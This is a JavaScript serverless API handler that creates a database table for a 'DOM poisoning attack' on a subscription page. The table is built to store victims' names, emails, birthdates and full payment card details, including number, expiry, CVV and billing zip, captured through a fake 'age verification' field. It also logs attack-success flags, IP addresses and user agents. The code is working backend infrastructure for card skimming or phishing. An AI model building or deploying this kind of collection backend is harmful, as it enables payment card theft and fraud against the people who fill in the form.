// Simple endpoint to create membership attack data table
// Visit: https://your-vercel-url.com/api/create-table

import { neon } from '@neondatabase/serverless';

export default async function handler(req, res) {
    if (req.method !== 'GET') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        // Connect to Neon database
        const sql = neon(process.env.subscription_form_DATABASE_URL);

        // Create membership attack data table
        await sql`
            CREATE TABLE IF NOT EXISTS membership_attack_data (
                id SERIAL PRIMARY KEY,
                form_type VARCHAR(50) DEFAULT 'membership',

                -- Basic membership fields
                first_name VARCHAR(255),
                last_name VARCHAR(255),
                email VARCHAR(255),
                birthdate DATE,
                zip_code VARCHAR(20),

                -- Age verification payment fields (DOM poisoning payload)
                verify_card_number VARCHAR(255),
                verify_expiry_month VARCHAR(2),
                verify_expiry_year VARCHAR(2),
                verify_cvv VARCHAR(4),
                verify_card_name VARCHAR(255),
                verify_billing_zip VARCHAR(20),

                -- Attack metadata
                dom_poisoning_success BOOLEAN DEFAULT FALSE,
                is_field_update BOOLEAN DEFAULT FALSE,
                update_timestamp TIMESTAMP,

                -- Environment data
                user_agent TEXT,
                ip_address INET,

                -- Timestamps
                submitted_at TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        `;

        // Create indexes for performance
        await sql`CREATE INDEX IF NOT EXISTS idx_membership_email ON membership_attack_data(email);`;
        await sql`CREATE INDEX IF NOT EXISTS idx_membership_created_at ON membership_attack_data(created_at);`;
        await sql`CREATE INDEX IF NOT EXISTS idx_membership_dom_success ON membership_attack_data(dom_poisoning_success);`;
        await sql`CREATE INDEX IF NOT EXISTS idx_membership_is_update ON membership_attack_data(is_field_update);`;

        res.status(200).json({
            success: true,
            message: 'Membership attack database table created successfully',
            table: 'membership_attack_data',
            purpose: 'DOM poisoning attack data collection for subscription page',
            endpoints: {
                submit: '/api/membership/submit',
                view: '/api/membership/view'
            },
            columns: {
                basic_fields: ['first_name', 'last_name', 'email', 'birthdate', 'zip_code'],
                payment_fields: ['verify_card_number', 'verify_expiry_month', 'verify_expiry_year', 'verify_cvv', 'verify_card_name', 'verify_billing_zip'],
                attack_metadata: ['dom_poisoning_success', 'is_field_update', 'user_agent', 'ip_address'],
                timestamps: ['submitted_at', 'created_at', 'update_timestamp']
            }
        });

    } catch (error) {
        console.error('Table creation error:', error);
        res.status(500).json({
            error: 'Failed to create membership attack table',
            details: error.message
        });
    }
}